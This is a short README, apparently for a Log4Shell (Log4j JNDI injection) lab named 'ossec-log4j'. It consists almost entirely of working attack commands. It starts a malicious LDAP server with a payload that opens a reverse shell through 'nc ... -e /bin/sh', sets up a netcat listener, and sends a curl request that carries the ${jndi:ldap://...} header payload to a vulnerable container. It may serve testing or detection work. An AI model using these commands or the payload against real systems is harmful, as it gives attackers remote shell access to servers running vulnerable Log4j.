# ossec-log4j

## LDAP Server

```console
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'nc <nc-listener-ip> 3000 -e /bin/sh'
```

## Vulnerable Application

```console
docker run --rm -p 8080:8080 --name vulnerable-app vulnerable-app
```

## Attacker Machine

### NC Listener

```console
nc -lv 3000
```

### Exploit

```console
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://<ipv4>:<port>/<random-string}'
```
